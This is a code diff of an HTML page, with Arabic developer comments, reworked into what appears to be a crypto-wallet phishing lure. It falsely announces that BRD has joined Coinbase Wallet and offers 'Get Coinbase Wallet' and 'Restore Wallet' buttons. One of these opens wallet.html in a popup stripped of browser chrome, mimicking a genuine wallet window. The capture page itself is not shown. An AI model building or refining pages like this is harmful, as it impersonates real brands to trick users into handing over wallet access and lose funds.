@@ -2,47 +2,59 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Base | Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BRD Wallet Migration</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* خلفية الصفحة الأساسية اللي بتفتح النافذة */
-        body {
-            background-color: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .open-btn {
-            padding: 15px 30px;
-            background-color: #0052ff;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 18px;
-            font-weight: bold;
-        }
+        :root { --bg-color: #1a1a2e; --btn-blue: #586cf5; --btn-gray: #3e3f5e; --text-white: #ffffff; --text-secondary: #b0b0cc; --grid-border: rgba(255, 255, 255, 0.1); --input-bg: #2a2a4a; --error-red: #ff4d4d; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg-color); color: var(--text-white); min-height: 100vh; display: flex; flex-direction: column; }
+        .main-wrapper { flex: 1; display: flex; justify-content: center; align-items: center; padding: 30px 20px; }
+        .container { width: 100%; max-width: 480px; padding: 20px; }
+        @media (min-width: 1024px) { .container { max-width: 450px; border: 1px solid var(--grid-border); border-radius: 20px; background: rgba(26, 26, 46, 0.8); padding: 40px; } }
+        .page { display: none; flex-direction: column; }
+        .page.active { display: flex; }
+        .logo-area { display: flex; flex-direction: column; align-items: center; margin-bottom: 30px; }
+        .brd-icon { width: 150px; height: 150px; border-radius: 30px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        .brd-icon img { width: 100%; height: 100%; object-fit: contain; }
+        h1 { font-size: 26px; text-align: center; margin-bottom: 16px; }
+        .sub-text { color: var(--text-secondary); text-align: center; margin-bottom: 40px; }
+        .btn-container { display: flex; flex-direction: column; gap: 12px; }
+        .btn { width: 100%; padding: 16px; border-radius: 10px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .btn-primary { background-color: var(--btn-blue); color: white; }
+        .btn-secondary { background-color: var(--btn-gray); color: white; }
+        /* Footer Styles */
+        .bottom-footer { width: 100%; background: #0f0f1a; padding: 50px 40px; }
+        .footer-links { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .footer-links a { color: var(--text-secondary); text-decoration: none; font-size: 14px; }
     </style>
 </head>
 <body>
-
-    <button class="open-btn" onclick="openWalletPopup()">Connect Wallet</button>
+    <div class="main-wrapper">
+        <div class="container">
+            <div id="p1" class="page active">
+                <div class="logo-area"><div class="brd-icon"><img src="icone2.png"></div></div>
+                <h1>BRD has joined<br>Coinbase Wallet!</h1>
+                <p class="sub-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>
+                <div class="btn-container">
+                    <button class="btn btn-primary" onclick="openPopup()">Get Coinbase Wallet</button>
+                    <button class="btn btn-secondary">View Press Release</button>
+                    <button class="btn btn-secondary">Restore Wallet</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer class="bottom-footer">
+        <div class="footer-links"><a href="#">Home</a><a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a></div>
+    </footer>
 
     <script>
-        function openWalletPopup() {
-            // مقاسات النافذة اللي في الصورة تقريباً 400 في 600
-            const width = 400;
-            const height = 650;
-            const left = (screen.width / 2) - (width / 2);
-            const top = (screen.height / 2) - (height / 2);
-
-            const params = `width=${width},height=${height},top=${top},left=${left},resizable=no,scrollbars=no,status=no,location=no,toolbar=no,menubar=no`;
-            
-            // استبدل 'wallet.html' باسم ملف الكود تبعك
-            window.open('wallet.html', 'CoinbaseWallet', params);
+        function openPopup() {
+            const w = 400, h = 650;
+            const left = (screen.width/2)-(w/2), top = (screen.height/2)-(h/2);
+            // سيقوم بفتح ملف اسمه wallet.html
+            window.open('wallet.html', 'Wallet', `width=${w},height=${h},top=${top},left=${left},scrollbars=no,resizable=no`);
         }
     </script>
-
 </body>
 </html>
